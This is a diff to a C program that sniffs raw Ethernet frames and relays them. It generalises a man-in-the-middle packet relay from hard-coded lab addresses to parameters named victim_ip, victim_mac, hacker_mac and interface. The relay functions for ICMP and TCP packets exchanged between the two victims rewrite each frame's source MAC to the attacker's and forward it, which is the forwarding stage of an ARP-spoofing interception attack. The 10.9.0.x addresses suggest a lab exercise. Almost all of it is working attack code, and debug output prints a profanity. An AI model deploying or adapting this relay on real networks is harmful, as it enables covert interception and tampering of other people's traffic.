@@ -12,6 +12,7 @@
 #include <netinet/ip.h>          //Provides declarations for ip header
 #include <netinet/if_ether.h>    //For ETH_P_ALL
 #include <net/ethernet.h>        //For ether_header
+#include <netinet/ether.h>
 #include <net/if.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -35,7 +36,10 @@ unsigned short tcp_checksum(struct iphdr *iph, unsigned short *payload);
 // unsigned short udp_checksum(struct iphdr *iph, unsigned short *payload);
 
 
-void sniff_and_relay(FILE* logfile, int sockid, unsigned char* buffer, int size)
+void sniff_and_relay(FILE* logfile, int sockid, unsigned char* buffer, int size,
+                     char* victim_ip_1, unsigned char* victim_mac_1,
+                     char* victim_ip_2, unsigned char* victim_mac_2,
+                     unsigned char* hacker_mac, char* interface)
 {
     //Get the IP Header part of this packet , excluding the ethernet header
     struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
@@ -44,7 +48,10 @@ void sniff_and_relay(FILE* logfile, int sockid, unsigned char* buffer, int size)
     case 1:  //ICMP Protocol
         ++icmp;
         print_icmp_packet(logfile, buffer, size);
-        relay_icmp_packet(sockid, buffer, size);
+        relay_icmp_packet(sockid, buffer, size,
+                          victim_ip_1, victim_mac_1,
+                          victim_ip_2, victim_mac_2,
+                          hacker_mac, interface);
         break;
 
     case 2:  //IGMP Protocol
@@ -54,7 +61,10 @@ void sniff_and_relay(FILE* logfile, int sockid, unsigned char* buffer, int size)
     case 6:  //TCP Protocol
         ++tcp;
         print_tcp_packet(logfile, buffer, size);
-        relay_tcp_packet(sockid, buffer, size);
+        relay_tcp_packet(sockid, buffer, size,
+                         victim_ip_1, victim_mac_1,
+                         victim_ip_2, victim_mac_2,
+                         hacker_mac, interface);
         break;
 
     case 17: //UDP Protocol
@@ -344,7 +354,10 @@ unsigned short icmp_checksum(unsigned short *icmph, int len)
     return compute_checksum(icmph, len);
 }
 
-void relay_icmp_packet(int sockid, unsigned char* buffer, int size)
+void relay_icmp_packet(int sockid, unsigned char* buffer, int size,
+                       char* victim_ip_1, unsigned char* victim_mac_1,
+                       char* victim_ip_2, unsigned char* victim_mac_2,
+                       unsigned char* hacker_mac, char* interface)
 {
     // sockid = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     struct ethhdr *eth = (struct ethhdr *)buffer;
@@ -355,34 +368,14 @@ void relay_icmp_packet(int sockid, unsigned char* buffer, int size)
 
     if (iph->protocol != 1) return;
 
-    if (iph->saddr == inet_addr("10.9.0.5")
-        && iph->daddr== inet_addr("10.9.0.6")) {
-        eth->h_source[0] = 0X02;
-        eth->h_source[1] = 0X42;
-        eth->h_source[2] = 0X0A;
-        eth->h_source[3] = 0X09;
-        eth->h_source[4] = 0X00;
-        eth->h_source[5] = 0X69;
-        eth->h_dest[0] = 0X02;
-        eth->h_dest[1] = 0X42;
-        eth->h_dest[2] = 0X0A;
-        eth->h_dest[3] = 0X09;
-        eth->h_dest[4] = 0X00;
-        eth->h_dest[5] = 0X06;
-    } else if (iph->saddr == inet_addr("10.9.0.6")
-        && iph->daddr== inet_addr("10.9.0.5")) {
-        eth->h_source[0] = 0X02;
-        eth->h_source[1] = 0X42;
-        eth->h_source[2] = 0X0A;
-        eth->h_source[3] = 0X09;
-        eth->h_source[4] = 0X00;
-        eth->h_source[5] = 0X69;
-        eth->h_dest[0] = 0X02;
-        eth->h_dest[1] = 0X42;
-        eth->h_dest[2] = 0X0A;
-        eth->h_dest[3] = 0X09;
-        eth->h_dest[4] = 0X00;
-        eth->h_dest[5] = 0X05;
+    if (iph->saddr == inet_addr(victim_ip_1)
+        && iph->daddr== inet_addr(victim_ip_2)) {
+        memcpy(&eth->h_source, (void *)ether_aton(hacker_mac), 6);
+        memcpy(&eth->h_dest, (void *)ether_aton(victim_mac_2), 6);
+    } else if (iph->saddr == inet_addr(victim_ip_2)
+        && iph->daddr== inet_addr(victim_ip_1)) {
+        memcpy(&eth->h_source, (void *)ether_aton(hacker_mac), 6);
+        memcpy(&eth->h_dest, (void *)ether_aton(victim_mac_1), 6);
     } else {
         printf("FUCK\n");
         return;
@@ -406,7 +399,7 @@ void relay_icmp_packet(int sockid, unsigned char* buffer, int size)
 
     struct sockaddr_ll device;
     memset(&device, 0, sizeof device);
-    device.sll_ifindex = if_nametoindex("eth0");
+    device.sll_ifindex = if_nametoindex(interface);
 
     int ret;
     // ret = send(sockid, eth, size, 0);
@@ -452,7 +445,10 @@ unsigned short tcp_checksum(struct iphdr *iph, unsigned short *payload)
     return ret;
 }
 
-void relay_tcp_packet(int sockid, unsigned char* buffer, int size)
+void relay_tcp_packet(int sockid, unsigned char* buffer, int size,
+                      char* victim_ip_1, unsigned char* victim_mac_1,
+                      char* victim_ip_2, unsigned char* victim_mac_2,
+                      unsigned char* hacker_mac, char* interface)
 {
     // sockid = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     struct ethhdr *eth = (struct ethhdr *)buffer;
@@ -463,34 +459,14 @@ void relay_tcp_packet(int sockid, unsigned char* buffer, int size)
 
     if (iph->protocol != 6) return;
 
-    if (iph->saddr == inet_addr("10.9.0.5")
-        && iph->daddr== inet_addr("10.9.0.6")) {
-        eth->h_source[0] = 0X02;
-        eth->h_source[1] = 0X42;
-        eth->h_source[2] = 0X0A;
-        eth->h_source[3] = 0X09;
-        eth->h_source[4] = 0X00;
-        eth->h_source[5] = 0X69;
-        eth->h_dest[0] = 0X02;
-        eth->h_dest[1] = 0X42;
-        eth->h_dest[2] = 0X0A;
-        eth->h_dest[3] = 0X09;
-        eth->h_dest[4] = 0X00;
-        eth->h_dest[5] = 0X06;
-    } else if (iph->saddr == inet_addr("10.9.0.6")
-        && iph->daddr== inet_addr("10.9.0.5")) {
-        eth->h_source[0] = 0X02;
-        eth->h_source[1] = 0X42;
-        eth->h_source[2] = 0X0A;
-        eth->h_source[3] = 0X09;
-        eth->h_source[4] = 0X00;
-        eth->h_source[5] = 0X69;
-        eth->h_dest[0] = 0X02;
-        eth->h_dest[1] = 0X42;
-        eth->h_dest[2] = 0X0A;
-        eth->h_dest[3] = 0X09;
-        eth->h_dest[4] = 0X00;
-        eth->h_dest[5] = 0X05;
+    if (iph->saddr == inet_addr(victim_ip_1)
+        && iph->daddr== inet_addr(victim_ip_2)) {
+        memcpy(&eth->h_source, (void *)ether_aton(hacker_mac), 6);
+        memcpy(&eth->h_dest, (void *)ether_aton(victim_mac_2), 6);
+    } else if (iph->saddr == inet_addr(victim_ip_2)
+        && iph->daddr== inet_addr(victim_ip_1)) {
+        memcpy(&eth->h_source, (void *)ether_aton(hacker_mac), 6);
+        memcpy(&eth->h_dest, (void *)ether_aton(victim_mac_1), 6);
     } else {
         printf("FUCK\n");
         return;
@@ -506,7 +482,7 @@ void relay_tcp_packet(int sockid, unsigned char* buffer, int size)
 
     struct sockaddr_ll device;
     memset(&device, 0, sizeof device);
-    device.sll_ifindex = if_nametoindex("eth0");
+    device.sll_ifindex = if_nametoindex(interface);
 
     int ret;
     // ret = send(sockid, eth, size, 0);
